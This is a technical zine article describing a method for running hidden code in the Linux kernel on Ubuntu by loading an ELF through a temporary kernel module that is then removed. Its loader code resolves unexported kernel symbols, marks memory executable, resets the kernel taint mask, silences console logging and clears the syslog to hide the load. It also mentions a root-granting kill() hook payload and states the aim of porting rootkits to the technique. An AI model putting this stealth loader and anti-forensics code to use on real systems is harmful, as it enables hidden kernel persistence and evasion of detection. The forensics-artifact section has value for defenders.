## Introduction and Background

I'll be discussing an approach for implementing LKM-less kernel modules that
persist in the kernel without a traditional LKM being consistently loaded.
This allows the module to be hidden without tampering with internal kernel
data structures and avoids detection tricks like those discussed by g1inko in
Phrack #71 [phrack-extrem].
The changes mostly consist of swapping out the build system and renaming the
module entrypoint to `_start`, to allow the full use of kernel headers.
The patched module is able to use unexported symbols freely, without needing
the usual kprobe trick on recent kernels, as it will be dynamically linked
against the addresses in kallsyms by the loader module.

This work derives from ulexec and Anonymous_'s work on [SHELF]s, which
inspired and was used as the basis for the linker script I used in my original
project [klude] and this updated version.

The original `klude` was written over the Christmas holidays in 2023, which
this improves upon by removing my overkill use of stages, fixing the remaining
bugs and cleaning up the code. We will just be insmod'ing a single module via
a loader binary, with the kSHELF bundled in. It should be noted that while I'm
calling these kSHELFs, the name is a bit of a misnomer as we are performing
dynamic linking.

There is some prior work by Ilya Matveychikov, in his [kopycat] and
[kmatryoshka] projects, which both focused on bypassing the normal LKM loading
process. kopycat is the closest to this work, as it was a shellcode loader
implemented via an LKM, but does not implement any ELF parsing.
kmatryoshka just called `sys_init_module()` from the module, but is worth
noting as it is included as a feature in the reptile rootkit
[reptile-kmatryoshka].
Also, suckit by sd and devik from Phrack 58 [phrack-suckit] is somewhat
similar in the idea of avoiding LKMs, though the technique of patching the
kernel via `/dev/mem` and `/dev/kmem` is long dead.

You can find the full source code uuencoded at the end, which uses this to
implement an ftrace hook with an updated version of xcellerator's ftrace code
for `kill()` that grants you root if you send a specific signal.
[xcellerator-killhook]

This supports and has been tested on Ubuntu 22.04 and 24.04, with the output
included in the article taken from Ubuntu 24.04. 22.04 requires swapping out
the base image used for building with what's used in this article
(`FROM ubuntu:22.04` instead). Other distros should be easily supported,
but you'll need to adjust the build environment.

## Approach

I'm structuring this article based on asking questions that ultimately build
up to the goal of running our own modules that can fully use kernel symbols
and remain loaded while the system is running.

These questions are:
* How do we get a build and development environment setup?
* How do kernel modules get built?
* Can we get a C compiler to output code that runs in the kernel?
* Can we get an ELF loader going?
* Are there any forensics considerations?

First, we need to figure out a build environment we can use.
We'll be using a docker based one as this makes it easier to adapt to
different kernel versions and distros.

As our ultimate goal requires bypassing the usual LKM build system, it is
worth examining whether we can figure out the CFLAGs we want.

To figure out how to to get code we can load into the kernel out of the C
compiler is pretty key for our objective and if we can get away with kernel
headers and symbols normally, our life gets much better as we don't need to
hack around things.

Finally, its worth knowing what artifacts we might be leaving behind.

## How do we setup a build environment?

Our primary build system is going to be based on Docker, as it is the easiest
way of getting this going. I will be focusing on Ubuntu 24.04 as at the time
of writing it is the latest LTS release.

My Dockerfile is the following, stored under `./build-system` in my repo:
```dockerfile
FROM ubuntu:24.04

ARG KVERSION=6.8.0-40-generic

RUN apt update && \
    apt -y upgrade && \
    apt install -y build-essential linux-headers-$KVERSION xxd python3

RUN mkdir -p /build /workdir

CMD cp -r /build/src /workdir/src && cd /workdir && make -C src
```

So far, fairly simple. There are however a few things that are worth noting:
* KVERSION can be overridden when building the container. I use it as the
  container tag so its easier to switch between versions of my toolchain.
* All we install are xxd, python3, the usual build-essentials and the kernel
  headers for the kernel version that we are targeting.
* We pass in `/build/src` directory that contains a Makefile to build the rest
  of the project.

We can build this container with:
```bash
docker build \
    --build-arg="KVERSION=$KVERSION" \
    -t bahorn/klude2-build:$KVERSION \
    ./build-system/
```

Which I personally invoke from a Makefile, keeping KVERSION defined as a
variable in the Makefile.

To use the container, I used the following build script:
```bash
mkdir -p artifacts && \
    docker run \
        --rm \
        -v `pwd`/src:/build/src:ro \
        -v `pwd`/artifacts:/workdir/artifacts:rw \
        -e KVERSION=$1 \
        bahorn/klude2-build:$1
```

This passes in the code into `/build/src`, and also creates an artifacts
directory for the output.

Finally, you want a test system. I installed the latest Ubuntu 24.04 LTS
release in KVM, and made sure KVERSION matched the one used in that VM.
Then the build artifact was scp'd over to test on the system.

You can also setup a kernel debugger if you want, but I survived fine with
printk debugging. See [easylkb] by ackmage and netspooky in tmp.0ut #3 for
a nice tool to set that up and create test kernels, which will be useful if
you want to port this across more releases!

### How are LKMs built?

LKMs get built via a Makefile based build system, which sets up all the CFLAGS
they need.
You just write a Makefile like:
```makefile
TARGET = test-lkm
ccflags-y := -std=gnu99 \
    -Wno-declaration-after-statement

obj-m += $(TARGET).o

test-lkm-m += ./main.o
```

And invoke it with something like:
```bash
make -C /usr/src/linux-headers-$(KVERSION) M=`pwd`/src modules
```

And it will be built automagically.

But, as we want to bypass the build system, it is worth using the `V=1` option
to see what commands actually get run, so we can extract the CFLAGS used.

```bash
# CC [M]  /workdir/src/src/test.o
  gcc-13 -Wp,-MMD,/workdir/src/src/.test.o.d -nostdinc -I./arch/x86/include -I./arch/x86/include/generated  -I./include -I./arch/x86/include/uapi -I./arch/x86/include/generated/uapi -I./include/uapi -I./include/generated/uapi -include ./include/linux/compiler-version.h -include ./include/linux/kconfig.h -I./ubuntu/include -include ./include/linux/compiler_types.h -D__KERNEL__ -fmacro-prefix-map=./= -std=gnu11 -fshort-wchar -funsigned-char -fno-common -fno-PIE -fno-strict-aliasing -mno-sse -mno-mmx -mno-sse2 -mno-3dnow -mno-avx -fcf-protection=none -m64 -falign-jumps=1 -falign-loops=1 -mno-80387 -mno-fp-ret-in-387 -mpreferred-stack-boundary=3 -mskip-rax-setup -mtune=generic -mno-red-zone -mcmodel=kernel -Wno-sign-compare -fno-asynchronous-unwind-tables -mindirect-branch=thunk-extern -mindirect-branch-register -mindirect-branch-cs-prefix -mfunction-return=thunk-extern -fno-jump-tables -mharden-sls=all -fpatchable-function-entry=16,16 -fno-delete-null-pointer-checks -O2 -fno-allow-store-data-races -fstack-protector-strong -fno-omit-frame-pointer -fno-optimize-sibling-calls -ftrivial-auto-var-init=zero -fno-stack-clash-protection -fzero-call-used-regs=used-gpr -pg -mrecord-mcount -mfentry -DCC_USING_FENTRY -falign-functions=16 -fstrict-flex-arrays=3 -fno-strict-overflow -fno-stack-check -fconserve-stack -Wall -Wundef -Werror=implicit-function-declaration -Werror=implicit-int -Werror=return-type -Werror=strict-prototypes -Wno-format-security -Wno-trigraphs -Wno-frame-address -Wno-address-of-packed-member -Wmissing-declarations -Wmissing-prototypes -Wframe-larger-than=1024 -Wno-main -Wno-unused-but-set-variable -Wno-unused-const-variable -Wno-dangling-pointer -Wvla -Wno-pointer-sign -Wcast-function-type -Wno-stringop-overflow -Wno-array-bounds -Wno-alloc-size-larger-than -Wimplicit-fallthrough=5 -Werror=date-time -Werror=incompatible-pointer-types -Werror=designated-init -Wenum-conversion -Wno-unused-but-set-variable -Wno-unused-const-variable -Wno-restrict -Wno-packed-not-aligned -Wno-format-overflow -Wno-format-truncation -Wno-stringop-truncation -Wno-override-init -Wno-missing-field-initializers -Wno-type-limits -Wno-shift-negative-value -Wno-maybe-uninitialized -Wno-sign-compare -g -gdwarf-5 -std=gnu99 -Wno-declaration-after-statement  -fsanitize=bounds-strict -fsanitize=shift -fsanitize=bool -fsanitize=enum  -DMODULE  -DKBUILD_BASENAME='"test"' -DKBUILD_MODNAME='"test_lkm"' -D__KBUILD_MODNAME=kmod_test_lkm -c -o /workdir/src/src/test.o /workdir/src/src/test.c
```

So when we build our own code, you will want the majority of these.
There are a few exceptions however, as we want PIE code and some flags
also cause a few conflicts.

### Can we get a C compiler to output code that runs in the kernel?

With our knowledge of the CFLAGS, we can now attempt to get some C loaded into
the kernel. This code is designed to work with the loader that will be
discussed in the next section.

#### Compiling

Outside the above and a few exceptions, we'll be using the following extra
CFLAGS:
```
       -O2 \
       -nostdinc \
       -isystem /usr/lib/gcc/x86_64-linux-gnu/11/include \
       -I$KBASE/include \
       -I$KBASE/arch/x86/include/ \
       -I$KBASE/arch/x86/include/generated \
       -I$KBASE/arch/x86/include/generated/uapi \
       -I$KBASE/arch/x86/include/uapi \
       -I$KBASE/include/uapi \
       -I$KBASE/include/generated/uapi \
       -I$KBASE/ubuntu/include \
       -include $KBASE/include/linux/compiler-version.h \
       -include $KBASE/include/linux/kconfig.h \
       -fPIE \
       -fno-plt \
```

Basically, just getting the kernel headers we need and dealing with dynamic
linking. For dynamic linking, we only want a GOT so that is why we specify
`-fno-plt`, and we need a PIE binary. And to document some pain and suffering,
make sure you always use `-O2` if you are using the kernel headers.

We define `KBASE=/usr/src/linux-headers-$KVERSION` so we use the correct
headers, containing this all in a wrapper called `kshelf-cc`.
But, with all the correct CFLAGS in the wrapper, now we can move onto the
linker setup.

See `src/kshelf-utils/kshelf-cc` for the full list!

#### Linker Script

We'll be adapting the existing SHELF linker script [SHELF-Loading] to create
three PHDRs:
* One for .text and read only data.
* One for read/write data
* One for dynamic linking.

```
PHDRS {
    text      PT_LOAD FILEHDR PHDRS;
    data      PT_LOAD;
    dynamic   PT_DYNAMIC;
}
```

Then, we reordered and are explicit about which PHDR each section is in.
(don't screw this up. If you mess up the order the linker produces very
confusing and useless ELFs! Make sure all of text becomes before data, and
dynamic after that.) This was done by placing `:text` or `:data` at the end
of the line for each section, to place them in the right segment we wanted
them in. Padding was placed between them, so they stayed aligned on disk.

The linker script is then used in a wrapper around ld to make `kshelf-ld`:
```bash
#!/bin/bash
LDFLAGS="-T /build/src/kshelf-utils/kshelf.ld -pie"
ld $LDFLAGS $@
```

Do not forget `-pie`. Your pointers in globals will be invalid otherwise, as a
needed relocation is not generated. Another lesson learned through experience.

Full linker script is in `src/kshelf-utils/kshelf.ld`.

#### Stub Library

We have the problem that if we try to compile against the kernel headers we
end up with a bunch of errors about undefined references, as we don't have a
library to link against. GCC needs them even if we only ever intend to do
dynamic linking against the symbols.

To work around this, I wrote a Python script to generate a file I can compile
to act as a stub library based off a copy of `kallsyms`:

```python
import sys

def main():
    f = open(sys.argv[1])
    for line in f:
        if '[' in line:
            continue
        if '.' in line:
            continue
        address, symbol_type, symbol = line.strip().split(' ')
        print(f'void *{symbol} = 0;')

if __name__ == "__main__":
    main()
```

Which can be compiled with:

```bash
python3 /build/src/kshelf-utils/stubgen.py /proc/kallsyms | sort | uniq \
         > /workdir/artifacts/stubs.c
gcc -Wno-builtin-declaration-mismatch -fno-plt -nostdlib -fPIE -shared \
    -o /workdir/artifacts/stub_lib /workdir/artifacts/stubs.c
```

You can do this as a normal user, and use one that doesn't exactly match with
the target kernel, as we do not care about the real addresses. You only need
a list of symbols.

#### All together now!

Now with all of our tooling setup, we can build our project with:
```bash
kshelf-cc -I ./include -c a.c -o a.o
kshelf-cc -I ./include -c b.c -o b.o
ld -r -o all.o a.o b.o
kshelf-ld -o /workdir/artifacts/main.bin ./all.o /workdir/artifacts/stub_lib
```

And we have a binary ready to be shipped off to the loader that we will build
up in the next step!

### Can we get an ELF loader going?

We are going to use an LKM as our loader, so we need to find out how to
process the ELF, allocate memory, perform relocations, make it executable, and
how to transfer control to it.

To understand what we have to do to set this up, lets first consider the output
ELF, which has the following PHDRs:
```
Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x00000000000007cb 0x00000000000007cb  R E    0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x0000000000000240 0x0000000000000248  RW     0x1000
  DYNAMIC        0x0000000000001248 0x0000000000003248 0x0000000000003248
                 0x0000000000000140 0x0000000000000140  RW     0x8

 Section to Segment mapping:
  Segment Sections...
   00     .hash .gnu.hash .dynsym .dynstr .text .rodata .modinfo
   01     .data .rela.dyn .got .init_array .bss
   02     .dynamic
```

If you look at each of the `PT_LOAD`s, you will notice their offsets and virtual
addresses line up to the standard 4k pages, so we just need a way of doing
contiguous and page aligned allocations. We can use `vmalloc()` for this, which
will be initially mapped as RW, and then `memcpy()` the binary to the
allocation. Then all we need to do is just fix the page permissions so they line
up with what is specified in the PHDR. But just before we fix the permissions
and transfer control, we do need to consider what relocations we need to
perform.

#### Dynamic Linking

To do dynamic linking for our ELF, we first we need to look at the dynamic
section to extract some values.

If you look at the output of readelf, you see the contents in the dynamic
section:
```
Dynamic section at offset 0x1248 contains 16 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [/workdir/artifacts/stub_lib]
 0x0000000000000019 (INIT_ARRAY)         0x1238
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x0000000000000004 (HASH)               0xe8
 0x000000006ffffef5 (GNU_HASH)           0x130
 0x0000000000000005 (STRTAB)             0x288
 0x0000000000000006 (SYMTAB)             0x168
 0x000000000000000a (STRSZ)              164 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000007 (RELA)               0x10e0
 0x0000000000000008 (RELASZ)             264 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffb (FLAGS_1)            Flags: PIE
 0x000000006ffffff9 (RELACOUNT)          4
 0x0000000000000000 (NULL)               0x0
```

This is just a table of `Elf64_Dyn`, which is a struct combining a tag and a
value. The tag is the type and we are mainly interested in the STRTAB, SYMTAB
and RELA tags. These are all offsets in binary, and RELAENT which is the number
of RELA entries.

Each RELA entry is a Elf64_Rela, defined in `elf.h` [elfheader]:
```c
typedef struct {
        Elf64_Addr      r_offset;
        Elf64_Xword     r_info;
        Elf64_Sxword    r_addend;
} Elf64_Rela;
```

We can access the relocation type by using the `ELF64_R_TYPE()` macro on the
`r_info` member.

When we look at the Relocation section of the ELF we see:
```
Relocation section '.rela.dyn' at offset 0x10e0 contains 11 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000001000  000000000008 R_X86_64_RELATIVE                    699

```

We now just need to implement two relocation types, `R_X86_64_GLOB_DAT`
and `R_X86_64_RELATIVE`.
* `R_X86_64_GLOB_DAT` is needed to implement the GOT, so we can call into
  kernel functions.
* `R_X86_64_RELATIVE` is needed as this is a PIE binary and if we have any
 pointers in the `.data` section they need to be updated with the base address
 of our code.

(A good reference for the calculations needed for each of the relocations is
in [relocationtypes])

For both, we get the location to patch with:
```c
unsigned long *to_patch = (unsigned long *)(elf + rela[i].r_offset);
```

`R_X86_64_RELATIVE` is implemented by updating the value at `r_offset`
in the binary with the new base address with `r_addend` added to it.

```c
*to_patch = elf + rela[i].r_addend;
```

`R_X86_64_GLOB_DAT` is a bit more involved to implement, as we need to look up
a symbol. We use `ELF64_R_SYM()` macro on `r_info`, which gives us an index
into SYMTAB. We then look at the `st_name` field, as symtab is an `Elf64_Sym`,
which is an index into STRTAB. With this index, we just pass it as a pointer to
`resolve_sym()`, which gives us the address we need to patch in to `r_offset`.

```c
int sym_idx = ELF64_R_SYM(rela[i].r_info);
char *symname = strtab + symtab[sym_idx].st_name;
*to_patch = resolve_sym(symname) + rela[i].r_addend;
```

It is worth noting that in [SHELFencounters], there is a discussion on using
the dynamic section from libc for resolving symbols (in the specific case,
__environ)  which can be applied if you wanted to implement this approach to
do dynamic linking in a userland SHELF.

#### Fixing Memory permissions

To fix the permissions, we need to iterate through each `PT_LOAD` segment,
which will be page aligned, and set the permissions using `set_memory_x()` and
`set_memory_ro()` if the segment is R+X. We can leave the rest as `RW` as it
shouldn't be an issue. Sadly, we can not just leave the whole binary as RWX
like the original SHELF concept due to recent kernels implementing a warning
with `STRICT_RWX`, with the eventual goal of disabling all RWX memory set via
these functions. [linux-c5129ec] For a brief period it was fully disabled in
the kernel, but caused issues resulting in it being downgraded to a warning.
[linux-652c5bf]

However, these functions are not exported in recent kernel versions, so we
need to work around that, which I did by using the classic kprobe trick with
code that derives from [xcellerator-ftrace], that everyone uses in their
rootkits to access unexported symbols:

```c
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

unsigned long resolve_sym(const char *sym_name)
{
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    return kallsyms_lookup_name(sym_name);
}
```

So we can now use these via:
```c
typedef int *(*set_memory_x_t)(unsigned long addr, int numpages);
typedef int *(*set_memory_ro_t)(unsigned long addr, int numpages);

set_memory_ro_t set_memory_ro = (set_memory_ro_t) resolve_sym("set_memory_ro");
set_memory_x_t set_memory_x = (set_memory_x_t) resolve_sym("set_memory_x");

set_memory_ro((uint64_t) base + phdr->p_vaddr, size);
set_memory_x((uint64_t) base + phdr->p_vaddr, size);
```

With all the permissions set correctly, execution can be transferred by just
jumping to the entrypoint listed in the ELF header. It is worth noting that it
is also possible for the binary to safely return back to the loader, which we
rely on.

```c
/* Transfer control */
typedef void (*start_t)(void);
start_t start = (start_t)(base + ehdr->e_entry);
start();
```

### Everything together, all at once.

Now we can assemble everything together into a single loader module that will
set everything up.

To reiterate the process:
* First build the kSHELF using the `kshelf-cc` and `kshelf-ld` wrappers.
* Strip the kSHELF, and run it through `xxd -i` to make it just a header.
* Then include the header in the loader and run it.
* Finally, insmod the loader and the kSHELF will be running, allowing us to
  just rmmod the loader afterwards.

One final note is that `xxd -n`, which lets you set the name of the variable
in the output header, is a new feature in `xxd`, so in releases pre-24.04 this
is not supported. I worked around it by using a small python reimplementation
of it.

### Are there any forensics considerations?

The primary artifacts I noticed was that when we load the kSHELF with the
loader module we get dmesg output telling us:

```
[   75.931455] kshelf_loader: loading out-of-tree module taints kernel.
[   75.931466] kshelf_loader: module verification failed: signature and/or required key missing - tainting kernel
```

To work around these I wrote the following code to load the kernel module:
```c
#include <stdio.h>
#include <linux/module.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/klog.h>

#include "../../artifacts/kshelf_loader.h"
#define MOD_NAME "kshelf_loader"

#define SYSLOG_ACTION_CLEAR 5

int init_module(void *module_image, unsigned long len, const char *param_values)
{
    return syscall(SYS_init_module, module_image, len, param_values);
}

int delete_module(const char *name, int flags)
{
    return syscall(SYS_delete_module, name, flags);
}

void set_printk(char c)
{
    int printk_fd = openat(
        AT_FDCWD, "/proc/sys/kernel/printk", O_WRONLY|O_CREAT|O_TRUNC, 0666
    );
    char printk_level[] = {c, '\n'};
    write(printk_fd, printk_level, 2);
    close(printk_fd);
}

int main()
{
    char params[128];
    /* Read the taint value */
    char taint_buf[64];
    int taint_fd = open("/proc/sys/kernel/tainted", 0);
    if (read(taint_fd, taint_buf, sizeof(taint_buf)) < 0) {
        return -1;
    }
    close(taint_fd);
    snprintf(params, 128, "taint_value=%s", taint_buf);
    printf("%s", params);
    /* Read the console printk values */
    char printk_level = 0x30;
    int printk_fd = open("/proc/sys/kernel/printk", 0);
    if (read(printk_fd, &printk_level, 1) < 0) {
        return -1;
    }
    /* Lower the console printk values*/
    set_printk('0');

    /* Load + Unload the module */
    init_module(kshelf_loader, kshelf_loader_len, params);
    delete_module(MOD_NAME, 0);

    /* Restore the console printk */
    set_printk(printk_level);

    /* Clear syslog. This doesn't actually remove the messages, but here for the
     * POC */
#ifdef CLEAN_DMESG
    klogctl(SYSLOG_ACTION_CLEAR, NULL, 0);
#endif
}
```

`artifacts/kshelf_loader.h` is just the output of `xxd -i` from the
kshelf-loader we built.

First, I read the existing value for the kernels taint so I could pass it to
the module which can change it back. The module just resolves the symbol
`tainted_mask` and sets it, which means the message will display every time a
module is loaded.

I then worked on disabling printing messages to the console so any messages
would not show up there when physically at the machine. Then, after loading the
module the console printk value was restored and the syslog is cleared.

As noted in the comment, this does not directly tamper with the kernel's ring
buffer. An exercise for the brave reader would be directly removing messages
from the kernel buffer, while preserving the rest, but this is beyond the scope
of this article.

It should be noted that the message about loading an unsigned module is only
displayed the first time an unsigned module is loaded, which is a potential
artifact that may hint that something was loaded if loading another unsigned
module doesn't display this message.

For another concern, `/proc/vmallocinfo` will not display any allocations that
can be directly linked to the kSHELF after the loader is unloaded.
For example, given the entrypoint message:

```
[   91.968682] Entrypoint: ffffc1d20039b370
```

We can see the following diff in vmallocinfo before and after we unload the
module:

```
< 0xffffc1d20039b000-0xffffc1d20039e000   12288 run_elf+0x2c/0x1c0 [kshelf_loader] pages=2 vmalloc N0=2
---
> 0xffffc1d20039b000-0xffffc1d20039e000   12288 qrtr_proto_init+0x41c/0xff0 [qrtr] pages=2 vmalloc N0=2
```

It shows up under a completely different function after the loader has been
rmmod'd. Potentially this could be considered anomalous, but it is unlikely to
draw attention otherwise. (*cough* another exercise for the reader is to see
how odd this is :))

Finally, for my sample payload, beware of the ftrace artifact in
`/proc/kallsyms`:

```
$ diff before after
239643a239644,239645
> ffffffffc0cb2000 t ftrace_trampoline  [__builtin__ftrace]
> ffffffffc0cb0000 t ftrace_trampoline  [__builtin__ftrace]
```

## Conclusion and Future Work

There are a few things I think that can be done to improve this work:
* Implementing a more normal module system, so kSHELFs can be unloaded
  properly without any remaining code left as an artifact in memory.
* Investigating other ways of linking them into the kernel, as part of a
  kernel exploit or by patching the kernel statically on disk.
* Port an existing rootkit to use this. At the time of writing none of the
  normal rootkits like diamorphine or kovid supported Ubuntu 24.04 (I tried!),
  but porting one would be the best sign of viability of this technique.

Anyway, hopefully this was interesting!

gr33tz to the tmp.0ut crew for a great zine, ulexec and Anonymous_ for
bringing SHELFs into existance, xcellerator for the great series on linux
rootkits that helped me learn the dark artz for this project, and my old
covhack friends.
